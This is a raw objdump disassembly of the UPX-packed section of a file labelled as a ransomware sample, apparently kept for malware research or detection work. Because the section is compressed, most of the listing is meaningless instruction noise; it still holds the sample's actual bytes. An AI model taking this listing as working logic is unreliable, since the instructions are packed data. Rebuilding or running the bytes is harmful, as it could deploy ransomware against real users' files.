
malware_samples/ransomware/77549422a5306f905d68153b1f649745d330d45e564c927046132ecc1d20ae3e.exe:     file format pei-i386


Disassembly of section UPX1:

00409000 <UPX1>:
  409000:	31 1a                	xor    %ebx,(%edx)
  409002:	d7                   	xlat   %ds:(%ebx)
  409003:	f7 68 36             	imull  0x36(%eax)
  409006:	86 00                	xchg   %al,(%eax)
  409008:	00 46 13             	add    %al,0x13(%esi)
  40900b:	00 00                	add    %al,(%eax)
  40900d:	00 30                	add    %dh,(%eax)
  40900f:	00 00                	add    %al,(%eax)
  409011:	26 00 00             	add    %al,%es:(%eax)
  409014:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  409015:	fe                   	(bad)
  409016:	7b ff                	jnp    0x409017
  409018:	ff 6a 01             	ljmp   *0x1(%edx)
  40901b:	6a 10                	push   $0x10
  40901d:	68 50 52 40 00       	push   $0x405250
  409022:	6a 00                	push   $0x0
  409024:	e8 00 00 16 18       	call   0x18569029
  409029:	0b 09                	or     (%ecx),%ecx
  40902b:	00 36                	add    %dh,(%esi)
  40902d:	a0 2b 75 83 7d       	mov    0x7d83752b,%al
  409032:	6b 5f 3c 01          	imul   $0x1,0x3c(%edi),%ebx
  409036:	75 11                	jne    0x409049
  409038:	20 1b                	and    %bl,(%ebx)
  40903a:	ff 35 1d 75 23 15    	push   0x1523751d
  409040:	d9 b1 ff bf 10 1e    	fnstenv 0x1e10bfff(%ecx)
  409046:	f8                   	clc
  409047:	c3                   	ret
  409048:	55                   	push   %ebp
  409049:	8b ec                	mov    %esp,%ebp
  40904b:	ff 75 08             	push   0x8(%ebp)
  40904e:	68 19 70 2f 16       	push   $0x162f7019
  409053:	0c 09                	or     $0x9,%al
  409055:	d6                   	salc
  409056:	ee                   	out    %al,(%dx)
  409057:	76 3f                	jbe    0x409098
  409059:	60                   	pusha
  40905a:	0f b6 05 2d 2d 83 f8 	movzbl 0xf8832d2d,%eax
  409061:	3c 68                	cmp    $0x68,%al
  409063:	43                   	inc    %ebx
  409064:	40                   	inc    %eax
  409065:	09 1a                	or     %ebx,(%edx)
  409067:	93                   	xchg   %eax,%ebx
  409068:	25 ec 1f 15 fa       	and    $0xfa151fec,%eax
  40906d:	eb 0f                	jmp    0x40907e
  40906f:	68 5e 10 09 7c       	push   $0x7c09105e
  409074:	ee                   	out    %al,(%dx)
  409075:	eb da                	jmp    0x409051
  409077:	6f                   	outsl  %ds:(%esi),(%dx)
  409078:	2e ff 74 02 eb       	push   %cs:-0x15(%edx,%eax,1)
  40907d:	67 63 01             	arpl   %eax,(%bx,%di)
  409080:	02 03                	add    (%ebx),%al
  409082:	68 66 7d c1 7e       	push   $0x7ec17d66
  409087:	b2 40                	mov    $0x40,%dl
  409089:	1f                   	pop    %ds
  40908a:	46                   	inc    %esi
  40908b:	a3 51 65 40 87       	mov    %eax,0x87406551
  409090:	65 12 df             	gs adc %bh,%bl
  409093:	7b af                	jnp    0x409044
  409095:	bb 22 68 61 11       	mov    $0x11616822,%ebx
  40909a:	50                   	push   %eax
  40909b:	12 18                	adc    (%eax),%bl
  40909d:	1e                   	push   %ds
  40909e:	28 f4                	sub    %dh,%ah
  4090a0:	6c                   	insb   (%dx),%es:(%edi)
  4090a1:	c2 be dd             	ret    $0xddbe
  4090a4:	68 56 0f 68 4e       	push   $0x4e680f56
  4090a9:	04 46                	add    $0x46,%al
  4090ab:	19 e8                	sbb    %ebp,%eax
  4090ad:	0a e5                	or     %ch,%ah
  4090af:	77 bb                	ja     0x40906c
  4090b1:	bf 3a c9 c2 04       	mov    $0x4c2c93a,%edi
  4090b6:	00 c1                	add    %al,%cl
  4090b8:	83 c4 18             	add    $0x18,%esp
  4090bb:	11 bb 00 bf f9 6d    	adc    %edi,0x6df9bf00(%ebx)
  4090c1:	ef                   	out    %eax,(%dx)
  4090c2:	ff 77 ff             	push   -0x1(%edi)
  4090c5:	51                   	push   %ecx
  4090c6:	57                   	push   %edi
  4090c7:	0f 31                	rdtsc
  4090c9:	5f                   	pop    %edi
  4090ca:	59                   	pop    %ecx
  4090cb:	25 f0 77 c1 e8       	and    $0xe8c177f0,%eax
  4090d0:	04 83                	add    $0x83,%al
  4090d2:	c0 61 aa e2          	shlb   $0xe2,-0x56(%ecx)
  4090d6:	ec                   	in     (%dx),%al
  4090d7:	33 c0                	xor    %eax,%eax
  4090d9:	aa                   	stos   %al,%es:(%edi)
  4090da:	68 2d b1 36 72       	push   $0x7236b12d
  4090df:	37                   	aaa
  4090e0:	c9                   	leave
  4090e1:	f9                   	stc
  4090e2:	6d                   	insl   (%dx),%es:(%edi)
  4090e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4090e4:	0e                   	push   %cs
  4090e5:	00 02                	add    %al,(%edx)
  4090e7:	00 a6 18 21 ec 66    	add    %ah,0x66ec2118(%esi)
  4090ed:	2f                   	das
  4090ee:	13 1d b6 21 40 29    	adc    0x294021b6,%ebx
  4090f4:	1c 72                	sbb    $0x72,%al
  4090f6:	f6 ff                	idiv   %bh
  4090f8:	64 0b c0             	fs or  %eax,%eax
  4090fb:	75 02                	jne    0x4090ff
  4090fd:	c9                   	leave
  4090fe:	c3                   	ret
  4090ff:	89 45 f0             	mov    %eax,-0x10(%ebp)
  409102:	50                   	push   %eax
  409103:	10 ee                	adc    %ch,%dh
  409105:	f4                   	hlt
  409106:	be 87 9c 2d 3a       	mov    $0x3a2d9c87,%esi
  40910b:	f0 12 be f8 50 0e c4 	lock adc -0x3bf1af08(%esi),%bh
  409112:	7b 26                	jnp    0x40913a
  409114:	e1 43                	loope  0x409159
  409116:	fc                   	cld
  409117:	8b d8                	mov    %eax,%ebx
  409119:	0a 03                	or     (%ebx),%al
  40911b:	c0 64 76 de 1e       	shlb   $0x1e,-0x22(%esi,%esi,2)
  409120:	26 46                	es inc %esi
  409122:	2a 52 22             	sub    0x22(%edx),%dl
  409125:	ec                   	in     (%dx),%al
  409126:	6a 00                	push   $0x0
  409128:	4a                   	dec    %edx
  409129:	66 97                	xchg   %ax,%di
  40912b:	6f                   	outsl  %ds:(%esi),(%dx)
  40912c:	df ec                	fucomip %st(4),%st
  40912e:	15 e2 0d 8d 45       	adc    $0x458d0de2,%eax
  409133:	e8 50 f4 53 11       	call   0x11948588
  409138:	0d 76 b6 12 09       	or     $0x912b676,%eax
  40913d:	16                   	push   %ss
  40913e:	e8 07 3a cf f2       	call   0xf30fcb4a
  409143:	75 cf                	jne    0x409114
  409145:	57                   	push   %edi
  409146:	52                   	push   %edx
  409147:	43                   	inc    %ebx
  409148:	14 17                	adc    $0x17,%al
  40914a:	28 f8                	sub    %bh,%al
  40914c:	6a 42                	push   $0x42
  40914e:	2b 1c 6e             	sub    (%esi,%ebp,2),%ebx
  409151:	7e 80                	jle    0x4090d3
  409153:	3d c0 be 0b 80       	cmp    $0x800bbec0,%eax
  409158:	e9 4e c2 ee f3       	jmp    0xf42f53ab
  40915d:	43                   	inc    %ebx
  40915e:	3e 34 42             	ds xor $0x42,%al
  409161:	fd                   	std
  409162:	eb 13                	jmp    0x409177
  409164:	14 fd                	adc    $0xfd,%al
  409166:	e1 ae                	loope  0x409116
  409168:	b0 e4                	mov    $0xe4,%al
  40916a:	d9 26                	fldenv (%esi)
  40916c:	06                   	push   %es
  40916d:	02 4b c3             	add    -0x3d(%ebx),%cl
  409170:	52                   	push   %edx
  409171:	c1 f0 ce             	shl    $0xce,%eax
  409174:	1d fc 53 be a3       	sbb    $0xa3be53fc,%eax
  409179:	75 14                	jne    0x40918f
  40917b:	bf b9 1c 54 0f       	mov    $0xf541cb9,%edi
  409180:	3f                   	aas
  409181:	c3                   	ret
  409182:	6e                   	outsb  %ds:(%esi),(%dx)
  409183:	ab                   	stos   %eax,%es:(%edi)
  409184:	00 bf 95 7a 08 68    	add    %bh,0x68087a95(%edi)
  40918a:	41                   	inc    %ecx
  40918b:	4e                   	dec    %esi
  40918c:	50                   	push   %eax
  40918d:	2c 2c                	sub    $0x2c,%al
  40918f:	3b 8c 50 36 32 0e a2 	cmp    -0x5df1cdca(%eax,%edx,2),%ecx
  409196:	fa                   	cli
  409197:	f7 b3 03 bb 21 75    	divl   0x7521bb03(%ebx)
  40919d:	0f 8b 49 09 c6 05    	jnp    0x6069aec
  4091a3:	50                   	push   %eax
  4091a4:	3f                   	aas
  4091a5:	7d 1b                	jge    0x4091c2
  4091a7:	b3 0d                	mov    $0xd,%bl
  4091a9:	1f                   	pop    %ds
  4091aa:	07                   	pop    %es
  4091ab:	08 b5 01 1e dc ff    	or     %dh,-0x23e1ff(%ebp)
  4091b1:	ef                   	out    %eax,(%dx)
  4091b2:	36 fc                	ss cld
  4091b4:	04 8e                	add    $0x8e,%al
  4091b6:	b9 19 1e bb 01       	mov    $0x1bb1e19,%ecx
  4091bb:	04 d3                	add    $0xd3,%al
  4091bd:	e3 23                	jecxz  0x4091e2
  4091bf:	d8 74 2d 80          	fdivs  -0x80(%ebp,%ebp,1)
  4091c3:	c1 41 88 0d          	roll   $0xd,-0x78(%ecx)
  4091c7:	50                   	push   %eax
  4091c8:	6e                   	outsb  %ds:(%esi),(%dx)
  4091c9:	7b f7                	jnp    0x4091c2
  4091cb:	b7 44                	mov    $0x44,%bh
  4091cd:	25 80 e9 41 c7       	and    $0xc741e980,%eax
  4091d2:	05 51 08 3a 5c       	add    $0x5c3a0851,%eax
  4091d7:	2a 2e                	sub    (%esi),%ch
  4091d9:	38 55 09             	cmp    %dl,0x9(%ebp)
  4091dc:	fe                   	(bad)
  4091dd:	e6 56                	out    %al,$0x56
  4091df:	b6 2a                	mov    $0x2a,%dh
  4091e1:	06                   	push   %es
  4091e2:	56                   	push   %esi
  4091e3:	3a 50 51             	cmp    0x51(%eax),%dl
  4091e6:	03 a4 59 58 49 7d c5 	add    -0x3a82b6a8(%ecx,%ebx,2),%esp
  4091ed:	92                   	xchg   %eax,%edx
  4091ee:	53                   	push   %ebx
  4091ef:	d6                   	salc
  4091f0:	e0 63                	loopne 0x409255
  4091f2:	75 33                	jne    0x409227
  4091f4:	f4                   	hlt
  4091f5:	77 40                	ja     0x409237
  4091f7:	c2 77 64             	ret    $0x6477
  4091fa:	e7 4b                	out    %eax,$0x4b
  4091fc:	14 36                	adc    $0x36,%al
  4091fe:	9a 31 2c cb 06 90 53 	lcall  $0x5390,$0x6cb2c31
  409205:	ab                   	stos   %eax,%es:(%edi)
  409206:	41                   	inc    %ecx
  409207:	ec                   	in     (%dx),%al
  409208:	14 0f                	adc    $0xf,%al
  40920a:	ce                   	into
  40920b:	74 c2                	je     0x4091cf
  40920d:	5b                   	pop    %ebx
  40920e:	c9                   	leave
  40920f:	27                   	daa
  409210:	e4 7c                	in     $0x7c,%al
  409212:	13 b7 e4 60 87 fd    	adc    -0x2789f1c(%edi),%esi
  409218:	08 fc                	or     %bh,%ah
  40921a:	16                   	push   %ss
  40921b:	85 c0                	test   %eax,%eax
  40921d:	74 14                	je     0x409233
  40921f:	0c 2e                	or     $0x2e,%al
  409221:	08 f7                	or     %dh,%bh
  409223:	ef                   	out    %eax,(%dx)
  409224:	1e                   	push   %ds
  409225:	fb                   	sti
  409226:	14 ec                	adc    $0xec,%al
  409228:	eb d7                	jmp    0x409201
  40922a:	30 81 ec 44 e3 8d    	xor    %al,-0x721cbb14(%ecx)
  409230:	85 bc fe ff ff 50 68 	test   %edi,0x6850ffff(%esi,%edi,8)
  409237:	df 85 c2 f2 bf 26    	filds  0x26bff2c2(%ebp)
  40923d:	58                   	pop    %eax
  40923e:	40                   	inc    %eax
  40923f:	0f 84 7d 03 48 73    	je     0x738895c2
  409245:	2c 44                	sub    $0x44,%al
  409247:	be db 63 1b 83       	mov    $0x831b63db,%esi
  40924c:	e0 10                	loopne 0x40925e
  40924e:	12 91 00 2a e8 25    	adc    0x25e82a00(%ecx),%dl
  409254:	b7 b2                	mov    $0xb2,%bh
  409256:	3b 61 5e             	cmp    0x5e(%ecx),%esp
  409259:	16                   	push   %ss
  40925a:	00 18                	add    %bl,(%eax)
  40925c:	32 03                	xor    (%ebx),%al
  40925e:	3e cc                	ds int3
  409260:	1c c8                	sbb    $0xc8,%al
  409262:	34 19                	xor    $0x19,%al
  409264:	55                   	push   %ebp
  409265:	16                   	push   %ss
  409266:	6c                   	insb   (%dx),%es:(%edi)
  409267:	2d 9b b0 f7 fe       	sub    $0xfef7b09b,%eax
  40926c:	09 50 c6             	or     %edx,-0x3a(%eax)
  40926f:	80 06 2f             	addb   $0x2f,(%esi)
  409272:	73 fa                	jae    0x40926e
  409274:	27                   	daa
  409275:	d9 1a                	fstps  (%edx)
  409277:	62 27                	bound  %esp,(%edi)
  409279:	12 c7                	adc    %bh,%al
  40927b:	21 5e 2a             	and    %ebx,0x2a(%esi)
  40927e:	2b 54 33 c9          	sub    -0x37(%ebx,%esi,1),%edx
  409282:	36 c2 56 58          	ss ret $0x5856
  409286:	16                   	push   %ss
  409287:	4f                   	dec    %edi
  409288:	53                   	push   %ebx
  409289:	90                   	nop
  40928a:	c3                   	ret
  40928b:	be cb e9 07 23       	mov    $0x2307e9cb,%esi
  409290:	1b 73 7c             	sbb    0x7c(%ebx),%esi
  409293:	43                   	inc    %ebx
  409294:	c8 61 a6 67          	enter  $0xa661,$0x67
  409298:	06                   	push   %es
  409299:	9c                   	pushf
  40929a:	4e                   	dec    %esi
  40929b:	18 5e 05             	sbb    %bl,0x5(%esi)
  40929e:	e4 80                	in     $0x80,%al
  4092a0:	1c 83                	sbb    $0x83,%al
  4092a2:	f9                   	stc
  4092a3:	6d                   	insl   (%dx),%es:(%edi)
  4092a4:	eb 60                	jmp    0x409306
  4092a6:	29 2b                	sub    %ebp,(%ebx)
  4092a8:	18 ae ad a0 2a b8    	sbb    %ch,-0x47d55f53(%esi)
  4092ae:	e4 fb                	in     $0xfb,%al
  4092b0:	35 3b 0a 1e cb       	xor    $0xcb1e0a3b,%eax
  4092b5:	8d 9d c0 53 d9 e3    	lea    -0x1c26ac40(%ebp),%ebx
  4092bb:	b9 b0 b3 50 65       	mov    $0x6550b3b0,%ecx
  4092c0:	1b 69 47             	sbb    0x47(%ecx),%ebp
  4092c3:	bb 1f db 75 72       	mov    $0x7275db1f,%ebx
  4092c8:	b3 74                	mov    $0x74,%bl
  4092ca:	37                   	aaa
  4092cb:	ab                   	stos   %eax,%es:(%edi)
  4092cc:	eb 30                	jmp    0x4092fe
  4092ce:	8b 3d 19 48 8b 0f    	mov    0xf8b4819,%edi
  4092d4:	6c                   	insb   (%dx),%es:(%edi)
  4092d5:	69 59 eb 83 c7 04 19 	imul   $0x1904c783,-0x15(%ecx),%ebx
  4092dc:	22 97 57 f9 78 b1    	and    -0x4e8706a9(%edi),%dl
  4092e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4092e3:	7f 03                	jg     0x4092e8
  4092e5:	f8                   	clc
  4092e6:	47                   	inc    %edi
  4092e7:	59                   	pop    %ecx
  4092e8:	83 fb 2e             	cmp    $0x2e,%ebx
  4092eb:	08 49 75             	or     %cl,0x75(%ecx)
  4092ee:	e0 31                	loopne 0x409321
  4092f0:	22 72 8b             	and    -0x75(%edx),%dh
  4092f3:	05 e9 d8 49 62       	add    $0x6249d8e9,%eax
  4092f8:	17                   	pop    %ss
  4092f9:	75 30                	jne    0x40932b
  4092fb:	42                   	inc    %edx
  4092fc:	72 61                	jb     0x40935f
  4092fe:	0c 5b                	or     $0x5b,%al
  409300:	f0 5b                	lock pop %ebx
  409302:	b2 c3                	mov    $0xc3,%dl
  409304:	1a c3                	sbb    %bl,%al
  409306:	0f 54 9b 1e 38 33 d0 	andps  -0x2fccc7e2(%ebx),%xmm3
  40930d:	1e                   	push   %ds
  40930e:	36 09 66 c6          	or     %esp,%ss:-0x3a(%esi)
  409312:	04 48                	add    $0x48,%al
  409314:	1d 79 c9 58 0b       	sbb    $0xb58c979,%eax
  409319:	2c 03                	sub    $0x3,%al
  40931b:	50                   	push   %eax
  40931c:	49                   	dec    %ecx
  40931d:	e0 28                	loopne 0x409347
  40931f:	1c 06                	sbb    $0x6,%al
  409321:	40                   	inc    %eax
  409322:	2d 0e 21 c0 03       	sub    $0x3c0210e,%eax
  409327:	02 23                	add    (%ebx),%ah
  409329:	41                   	inc    %ecx
  40932a:	6a 10                	push   $0x10
  40932c:	82 a3 55 e0 2c 20 df 	andb   $0xdf,0x202ce055(%ebx)
  409333:	1a 83 f8 08 7d 10    	sbb    0x107d08f8(%ebx),%al
  409339:	cc                   	int3
  40933a:	3e 63 27             	arpl   %esp,%ds:(%edi)
  40933d:	e4 79                	in     $0x79,%al
  40933f:	44                   	inc    %esp
  409340:	36 2e 88 6a 42       	ss mov %ch,%cs:0x42(%edx)
  409345:	a9 1b db 35 b0       	test   $0xb035db1b,%eax
  40934a:	65 14 7b             	gs adc $0x7b,%al
  40934d:	68 5d 11 ad 05       	push   $0x5ad115d
  409352:	8d                   	lea    (bad),%esi
  409353:	f0 09 1b             	lock or %ebx,(%ebx)
  409356:	59                   	pop    %ecx
  409357:	1d d0 83 3d 5d       	sbb    $0x5d3d83d0,%eax
  40935c:	0a 05 ab fb 49 d8    	or     0xd849fbab,%al
  409362:	5a                   	pop    %edx
  409363:	06                   	push   %es
  409364:	ef                   	out    %eax,(%dx)
  409365:	22 6c 8a 10          	and    0x10(%edx,%ecx,4),%ch
  409369:	b9 10 ac be 1a       	mov    $0x1abeac10,%ecx
  40936e:	bc 0b 7c f7 bf       	mov    $0xbff77c0b,%esp
  409373:	85 04 ac             	test   %eax,(%esp,%ebp,4)
  409376:	32 c2                	xor    %dl,%al
  409378:	d0 c2                	rol    $1,%dl
  40937a:	75 f8                	jne    0x409374
  40937c:	a1 2f 3b 6f f8       	mov    0xf86f3b2f,%eax
  409381:	2e 07                	cs pop %es
  409383:	2c 75                	sub    $0x75,%al
  409385:	35 07 17 07 44       	xor    $0x44071707,%eax
  40938a:	eb 15                	jmp    0x4093a1
  40938c:	0f 39                	(bad)
  40938e:	c2 be 27             	ret    $0x27be
  409391:	76 eb                	jbe    0x40937e
  409393:	05 06 93 8d 61       	add    $0x618d9306,%eax
  409398:	29 6c 00 19          	sub    %ebp,0x19(%eax,%eax,1)
  40939c:	5d                   	pop    %ebp
  40939d:	f4                   	hlt
  40939e:	da 09                	fimull (%ecx)
  4093a0:	11 06                	adc    %eax,(%esi)
  4093a2:	06                   	push   %es
  4093a3:	1f                   	pop    %ds
  4093a4:	58                   	pop    %eax
  4093a5:	44                   	inc    %esp
  4093a6:	f8                   	clc
  4093a7:	96                   	xchg   %eax,%esi
  4093a8:	82 34 ca 75          	xorb   $0x75,(%edx,%ecx,8)
  4093ac:	ed                   	in     (%dx),%eax
  4093ad:	fa                   	cli
  4093ae:	0e                   	push   %cs
  4093af:	5e                   	pop    %esi
  4093b0:	2f                   	das
  4093b1:	0d d6 6e 52 85       	or     $0x85526ed6,%eax
  4093b6:	8f                   	(bad)
  4093b7:	fc                   	cld
  4093b8:	10 0f                	adc    %cl,(%edi)
  4093ba:	52                   	push   %edx
  4093bb:	9f                   	lahf
  4093bc:	8b c8                	mov    %eax,%ecx
  4093be:	c1 7f ec 0f          	sarl   $0xf,-0x14(%edi)
  4093c2:	ff                   	ljmp   (bad)
  4093c3:	e9 02 85 c9 74       	jmp    0x750a18ca
  4093c8:	28 3b                	sub    %bh,(%ebx)
  4093ca:	05 02 74 01 41       	add    $0x41017402,%eax
  4093cf:	8b 77 8b             	mov    -0x75(%edi),%esi
  4093d2:	fe                   	(bad)
  4093d3:	33 d2                	xor    %edx,%edx
  4093d5:	83 fa f8             	cmp    $0xfffffff8,%edx
  4093d8:	c0 5b 81 10          	rcrb   $0x10,-0x7f(%ebx)
  4093dc:	d3 06                	roll   %cl,(%esi)
  4093de:	ad                   	lods   %ds:(%esi),%eax
  4093df:	33 82 0e ab 83 ec    	xor    -0x137c54f2(%edx),%eax
  4093e5:	bf 6d 34 7a 32       	mov    $0x327a346d,%edi
  4093ea:	eb 31                	jmp    0x40941d
  4093ec:	d8 c1                	fadd   %st(1),%st
  4093ee:	eb 03                	jmp    0x4093f3
  4093f0:	85 db                	test   %ebx,%ebx
  4093f2:	74 13                	je     0x409407
  4093f4:	28 4e 60             	sub    %cl,0x60(%esi)
  4093f7:	ff f7                	push   %edi
  4093f9:	56                   	push   %esi
  4093fa:	56                   	push   %esi
  4093fb:	cf                   	iret
  4093fc:	e8 83 c6 08 4b       	call   0x4b495a84
  409401:	75 f3                	jne    0x4093f6
  409403:	1c 08                	sbb    $0x8,%al
  409405:	ac                   	lods   %ds:(%esi),%al
  409406:	bf dd 7a 4d 0b       	mov    $0xb4d7add,%edi
  40940b:	b2 08                	mov    $0x8,%dl
  40940d:	8b 01                	mov    (%ecx),%eax
  40940f:	50                   	push   %eax
  409410:	04 0f                	add    $0xf,%al
  409412:	c9                   	leave
  409413:	0f 93 ee             	setae  %dh
  409416:	fb                   	sti
  409417:	e1 ca                	loope  0x4093e3
  409419:	89 0d 3f 89 15 99    	mov    %ecx,0x9915893f
  40941f:	6e                   	outsb  %ds:(%esi),(%dx)
  409420:	48                   	dec    %eax
  409421:	15 0c 83 1f 98       	adc    $0x981f830c,%eax
  409426:	91                   	xchg   %eax,%ecx
  409427:	9d                   	popf
  409428:	a1 ec 8d 49 ef       	mov    0xef498dec,%eax
  40942d:	ff f6                	push   %esi
  40942f:	df fe                	(bad)
  409431:	57                   	push   %edi
  409432:	56                   	push   %esi
  409433:	53                   	push   %ebx
  409434:	8b 75 22             	mov    0x22(%ebp),%esi
  409437:	06                   	push   %es
  409438:	8b 56 04             	mov    0x4(%esi),%edx
  40943b:	33 db                	xor    %ebx,%ebx
  40943d:	0f c8                	bswap  %eax
  40943f:	26 81 c3 b9 79 37 9e 	es add $0x9e3779b9,%ebx
  409446:	8b dd                	mov    %ebp,%ebx
  409448:	ff e1                	jmp    *%ecx
  40944a:	ff ca                	dec    %edx
  40944c:	c1 e1 04             	shl    $0x4,%ecx
  40944f:	8b fa                	mov    %edx,%edi
  409451:	8d 34 13             	lea    (%ebx,%edx,1),%esi
  409454:	03 0d 87 c1 ef 05    	add    0x5efc187,%ecx
  40945a:	33 ce                	xor    %esi,%ecx
  40945c:	03 3d 89 0a 33 c9    	add    0xc9330a89,%edi
  409462:	b2 74                	mov    $0x74,%dl
  409464:	ee                   	out    %al,(%dx)
  409465:	cf                   	iret
  409466:	03 c1                	add    %ecx,%eax
  409468:	dc 1e                	fcompl (%esi)
  40946a:	f8                   	clc
  40946b:	03 8d 1d 00 76 72    	add    0x7276001d(%ebp),%ecx
  409471:	91                   	xchg   %eax,%ecx
  409472:	d1 43 b9             	roll   $1,-0x47(%ebx)
  409475:	57                   	push   %edi
  409476:	2e ec                	cs in  (%dx),%al
  409478:	fe 42 0f             	incb   0xf(%edx)
  40947b:	af                   	scas   %es:(%edi),%eax
  40947c:	0d a5 0f 3b d9       	or     $0xd93b0fa5,%eax
  409481:	5d                   	pop    %ebp
  409482:	64 ff 9f d8 db cb b7 	lcall  *%fs:-0x48342428(%edi)
  409489:	ad                   	lods   %ds:(%esi),%eax
  40948a:	0c 89                	or     $0x89,%al
  40948c:	06                   	push   %es
  40948d:	89 5b 5e             	mov    %ebx,0x5e(%ebx)
  409490:	5f                   	pop    %edi
  409491:	c5 08                	lds    (%eax),%ecx
  409493:	00 90 c3 64 ef 9c    	add    %dl,-0x63109b3d(%eax)
  409499:	5d                   	pop    %ebp
  40949a:	bb 35 1d 2d 64       	mov    $0x642d1d35,%ebx
  40949f:	7b 9f                	jnp    0x409440
  4094a1:	c8 4e 2b d1          	enter  $0x2b4e,$0xd1
  4094a5:	a2 2b c1 81 eb       	mov    %al,0xeb81c12b
  4094aa:	4e                   	dec    %esi
  4094ab:	43                   	inc    %ebx
  4094ac:	05 b2 0d 00 bf       	add    $0xbf000db2,%eax
  4094b1:	72 19                	jb     0x4094cc
  4094b3:	3f                   	aas
  4094b4:	83 8f f6 7e 06 9a a3 	orl    $0xffffffa3,-0x65f9810a(%edi)
  4094bb:	66 77 5d             	data16 ja 0x40951b
  4094be:	3d 5e 69 fa 70       	cmp    $0x70fa695e,%eax
  4094c3:	a3 5e 77 98 0a       	mov    %eax,0xa98775e
  4094c8:	07                   	pop    %es
  4094c9:	cf                   	iret
  4094ca:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4094cb:	1f                   	pop    %ds
  4094cc:	83 83 19 09 9b 27 a4 	addl   $0xffffffa4,0x279b0919(%ebx)
  4094d3:	c7 45 d0 30 27 e7 9a 	movl   $0x9ae72730,-0x30(%ebp)
  4094da:	3f                   	aas
  4094db:	6f                   	outsl  %ds:(%esi),(%dx)
  4094dc:	06                   	push   %es
  4094dd:	d4 03                	aam    $0x3
  4094df:	20 d8                	and    %bl,%al
  4094e1:	b9 1a 40 dc 13       	mov    $0x13dc401a,%ecx
  4094e6:	06                   	push   %es
  4094e7:	5b                   	pop    %ebx
  4094e8:	83 86 4e e0 8a 8f 2f 	addl   $0x2f,-0x70751fb2(%esi)
  4094ef:	13 f0                	adc    %eax,%esi
  4094f1:	45                   	inc    %ebp
  4094f2:	a1 b3 91 10 f4       	mov    0xf41091b3,%eax
  4094f7:	1a f8                	sbb    %al,%bh
  4094f9:	40                   	inc    %eax
  4094fa:	9b                   	fwait
  4094fb:	8b b3 f2 ab 7f 73    	mov    0x737fabf2(%ebx),%esi
  409501:	0a 34 1c             	or     (%esp,%ebx,1),%dh
  409504:	fc                   	cld
  409505:	46                   	inc    %esi
  409506:	36 f8                	ss clc
  409508:	26 60                	es pusha
  40950a:	fc                   	cld
  40950b:	6d                   	insl   (%dx),%es:(%edi)
  40950c:	d0 1c 8e             	rcrb   $1,(%esi,%ecx,4)
  40950f:	c3                   	ret
  409510:	7e de                	jle    0x4094f0
  409512:	16                   	push   %ss
  409513:	b0 2c                	mov    $0x2c,%al
  409515:	01 ac 69 00 2e 04 f0 	add    %ebp,-0xffbd200(%ecx,%ebp,2)
  40951c:	be 49 2c bb b0       	mov    $0xb0bb2c49,%esi
  409521:	37                   	aaa
  409522:	0e                   	push   %cs
  409523:	59                   	pop    %ecx
  409524:	a8 71                	test   $0x71,%al
  409526:	12 ac bd 5d 89 41 a4 	adc    -0x5bbe76a3(%ebp,%edi,4),%ch
  40952d:	f5                   	cmc
  40952e:	0d 08 50 12 81       	or     $0x81125008,%eax
  409533:	bf 96 cd 28 02       	mov    $0x228cd96,%edi
  409538:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  409539:	a8 7d                	test   $0x7d,%al
  40953b:	10 a0 2d 82 24 4a    	adc    %ah,0x4a24822d(%eax)
  409541:	91                   	xchg   %eax,%ecx
  409542:	38 07                	cmp    %al,(%edi)
  409544:	10 aa 02 3e fd f7    	adc    %ch,-0x802c1fe(%edx)
  40954a:	d8 8c 80 01 04 5b 14 	fmuls  0x145b0401(%eax,%eax,4)
  409551:	e0 a3                	loopne 0x4094f6
  409553:	62 77 7c             	bound  %esi,0x7c(%edi)
  409556:	62 77 31             	bound  %esi,0x31(%edi)
  409559:	38 24 4e             	cmp    %ah,(%esi,%ecx,2)
  40955c:	34 0a                	xor    $0xa,%al
  40955e:	b4 f4                	mov    $0xf4,%ah
  409560:	e4 90                	in     $0x90,%al
  409562:	27                   	daa
  409563:	da fe                	(bad)
  409565:	83 bb 0b b4 b4 4f 16 	cmpl   $0x16,0x4fb4b40b(%ebx)
  40956c:	da 18                	ficompl (%eax)
  40956e:	d8 fa                	fdivr  %st(2),%st
  409570:	bc bc 10 bc 81       	mov    $0x81bc10bc,%esp
  409575:	73 73                	jae    0x4095ea
  409577:	0b ee                	or     %esi,%ebp
  409579:	7d 0c                	jge    0x409587
  40957b:	11 b5 6f 7e 05 0c    	adc    %esi,0xc057e6f(%ebp)
  409581:	10 f5                	adc    %dh,%ch
  409583:	e9 ba 67 05 71       	jmp    0x7145fd42
  409588:	bd 4c e9 a6 44       	mov    $0x44a6e94c,%ebp
  40958d:	14 f6                	adc    $0xf6,%al
  40958f:	ee                   	out    %al,(%dx)
  409590:	90                   	nop
  409591:	38 ec                	cmp    %ch,%ah
  409593:	3b 93 19 a6 f8 8e    	cmp    -0x710759e7(%ebx),%edx
  409599:	3e 5d                	ds pop %ebp
  40959b:	e4 73                	in     $0x73,%al
  40959d:	be 2a 10 18 fd       	mov    $0xfd18102a,%esi
  4095a2:	4f                   	dec    %edi
  4095a3:	41                   	inc    %ecx
  4095a4:	95                   	xchg   %eax,%ebp
  4095a5:	63 5d 48             	arpl   %ebx,0x48(%ebp)
  4095a8:	43                   	inc    %ebx
  4095a9:	f4                   	hlt
  4095aa:	65 16                	gs push %ss
  4095ac:	03 62 e1             	add    -0x1f(%edx),%esp
  4095af:	7e 6e                	jle    0x40961f
  4095b1:	cc                   	int3
  4095b2:	25 75 1b b8 ff       	and    $0xffb81b75,%eax
  4095b7:	00 f6                	add    %dh,%dh
  4095b9:	fd                   	std
  4095ba:	0e                   	push   %cs
  4095bb:	f6 ec                	imul   %ah
  4095bd:	04 11                	add    $0x11,%al
  4095bf:	bc 47 79 ff 0d       	mov    $0xdff7947,%esp
  4095c4:	23 68 01             	and    0x1(%eax),%ebp
  4095c7:	81 83 dc dd 34 68 ba 	addl   $0xbc5277ba,0x6834dddc(%ebx)
  4095ce:	77 52 bc 
  4095d1:	02 00                	add    (%eax),%al
  4095d3:	14 f8                	adc    $0xf8,%al
  4095d5:	8f                   	(bad)
  4095d6:	e7 33                	out    %eax,$0x33
  4095d8:	0a f6                	or     %dh,%dh
  4095da:	97                   	xchg   %eax,%edi
  4095db:	00 19                	add    %bl,(%ecx)
  4095dd:	ca 10 68             	lret   $0x6810
  4095e0:	65 9b                	gs fwait
  4095e2:	99                   	cltd
